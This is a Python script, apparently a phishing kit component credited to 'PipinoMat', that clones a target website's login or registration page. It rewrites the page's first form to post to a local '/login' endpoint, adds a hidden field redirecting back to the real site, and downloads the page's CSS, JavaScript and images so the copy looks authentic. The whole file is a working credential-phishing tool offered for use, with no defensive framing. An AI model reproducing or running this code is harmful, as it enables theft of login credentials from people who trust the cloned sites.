#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import os
import urllib.parse
import re
from urllib.parse import urljoin, urlparse

print("""        
     ______ __         __         __ _______              __    
    |   __ \__|.-----.|__|.-----.|__|   |   |.---.-.----.|  |--.
    |    __/  ||  _  ||  ||     ||  |       ||  _  |  __||    < 
    |___|  |__||   __||__||__|__||__|___|___||___._|____||__|__|
               |__|       Made In Italy                                      

    TG: @YoungestMoonstar - GitHub: /PipinoMat""")


def sanitize_filename(filename):
    """Rimuove caratteri non validi dai nomi file"""
    return re.sub(r'[^\w\-_\.]', '_', filename)


def download_asset(base_url, url, dir_name):
    """Scarica singolo asset"""
    try:
        full_url = urljoin(base_url, url)
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            parsed = urlparse(full_url)
            filename = sanitize_filename(os.path.basename(parsed.path) or 'asset')
            dir_path = os.path.join('static', dir_name)
            os.makedirs(dir_path, exist_ok=True)
            filepath = os.path.join(dir_path, filename)

            with open(filepath, 'wb') as f:
                f.write(response.content)

            return f"/static/{dir_name}/{filename}"
    except:
        pass
    return url


def download_css_js_images(base_url, soup):
    """Scarica CSS, JS e immagini - VERSIONE FIXATA"""
    assets = {
        'css': [('link', 'href')],
        'js': [('script', 'src')],
        'images': [('img', 'src'), ('img', 'data-src'), ('source', 'srcset')]
    }

    for dir_name, tags in assets.items():
        for tag, attr in tags:
            for element in soup.find_all(tag):
                url = element.get(attr)
                if url and (url.startswith('http') or url.startswith('/')):
                    new_url = download_asset(base_url, url, dir_name)
                    if new_url != url:
                        element[attr] = new_url
                        print(f"📥 {dir_name}/{os.path.basename(new_url)}")


def clone_login_page(target_url):
    """Clona pagina di login/register - VERSIONE CORRETTA"""
    print(f"🔍 Cloning {target_url}...")

    parsed = urlparse(target_url)
    clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    try:
        response = requests.get(clean_url, timeout=15)
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Errore fetch {clean_url}: {e}")
        return False

    soup = BeautifulSoup(response.content, 'html.parser')

    # Cerca form (login/register)
    forms = soup.find_all('form')
    if not forms:
        print("❌ Nessun form trovato!")
        return False

    target_form = forms[0]  # Prendi primo form

    print("✅ Form trovato, modificando...")

    # Modifica form
    target_form['action'] = '/login'
    target_form['method'] = 'POST'

    # Crea input hidden con sintassi corretta
    hidden_input = soup.new_tag("input")
    hidden_input['type'] = 'hidden'
    hidden_input['name'] = 'redirect_url'
    hidden_input['value'] = target_url
    target_form.append(hidden_input)

    # Scarica assets
    download_css_js_images(clean_url, soup)

    # Salva template
    with open('templates/login.html', 'w', encoding='utf-8') as f:
        f.write('<!DOCTYPE html>' + str(soup))

    print("✅ Clonazione COMPLETATA!")
    print("📁 templates/login.html pronto")
    return True


if __name__ == "__main__":
    target = input("🔗 URL pagina login: ").strip()
    if target.startswith(('http://', 'https://')):
        clone_login_page(target)
    else:
        print("❌ URL deve iniziare con http:// o https://")
